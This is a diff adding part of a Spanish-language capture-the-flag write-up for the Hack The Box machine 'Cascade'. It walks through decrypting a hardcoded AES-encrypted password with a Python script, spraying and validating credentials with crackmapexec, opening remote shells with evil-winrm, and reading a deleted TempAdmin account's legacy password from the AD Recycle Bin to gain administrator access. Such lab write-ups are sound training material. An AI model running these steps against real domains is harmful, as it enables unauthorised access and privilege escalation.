@@ -430,6 +430,288 @@ Vemos que teniamos un archivo `.exe` en los recursos compartidos que podemos int
 Audit.db  "CascAudit.exe"
 ```
 
+Procedemos a pasarnos el Archivo CascAudit.exe a una maquina Windows con el Sofware `DotUltimate` para analizar el codigo
+
+Conseguimos ver que se esta untilizando un Cifrado CBC y encontramos una `Key`
+
+Encontramos un Script para Desencryptar la password encontrada
+
+```bash
+# cat Decode_Pass.py                                                                                     130 ⨯ 1 ⚙
+import pyaes
+from base64 import b64decode
+# Variables
+key = b"c4scadek3y654321" # Encontramos esta KEY mirando el Codigo del CascAudit.exe desde Windows con DotUltimate 
+iv = b"1tdyjCbY1Ix49842"
+
+# CBC Operation
+aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
+
+# Desencriptado con la password que encontramos en Audit.db
+decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
+print(decrypted.decode())
+```
+
+Procedemos a usar el script en python una vez seteamos el valor de `key` y `La Password encontrada en Decrypted`
+
+```bash
+# python3 Decode_Pass.py                                                                                                 1 ⚙
+
+w3lc0meFr31nd
+```
+
+Ya tendriamos la contraseña del usuario `ArkSvc`, procedemos a validarla con `Crackmapexec`
+
+```bash
+# crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                           1 ⚙
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
+                                                                                                                                                                      # crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                                                                                                                                         1 ⚙
+WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+```
+
+Procedemos a intentar conectarnos como el usuario `ArkSvc` con `evil-winrm.rb`
+
+```bash
+# evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd                                                         1 ⚙
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> 
+```
+
+Enumeramos los privilegios para el usuario
+
+```bash
+*Evil-WinRM* PS C:\Users\arksvc> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+
+Enumeramos los Grupos a los que pertenece el usuario `ArkSvc`
+
+```bash
+*Evil-WinRM* PS C:\Users> net user arksvc
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+Users comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 4:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 4:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/29/2020 9:05:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      "*AD Recycle Bin"       "*IT"
+                             "*Remote Management Use"
+Global Group memberships     "*Domain Users"
+The command completed successfully.
+```
+
+Vemos que pertenecemos al Grupo `AD Recycle Bin`
+
+```bash
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=Deleted Objects,DC=cascade,DC=local
+Name              : Deleted Objects
+ObjectClass       : container
+ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681
+
+Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+```
+
+Procedemos a buscar por el Name `Temp Admin` que como nos decian habia tenido temporamente una password = a la del Administrador
+
+Procedemos a intentar listar todo el Contenido anterior y sus Propiedades con el siguiente Comando en PowerShell
+
+```bash
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+"cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz"
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+```
+
+Procedemos a decodear la password
+
+```bash
+$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d 
+
+"baCT3r1aN00dles"
+```
+
+Probamos con Crackmapexec a hacer validar para que usuario perneceria esta password
+```bash
+# crackmapexec smb 10.10.10.182 -u users -p baCT3r1aN00dles                                                                             
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles "(Pwn3d!)"
+```
+
+Procedemos a conectarnos con Evil WinRM y sacar la Flag de Root.txt
+```bash
+# evil-winrm.rb -i 10.10.10.182 -u administrator -p baCT3r1aN00dles                                                 
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/25/2022   8:53 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+XXXXXXXXXXb5ab6469c8baea4d5xxxxx
+```
+
+Maquina Cascade - AD Path - Rooteada =) Seguimos H4ck
+
+
+
+
+
 
 
 
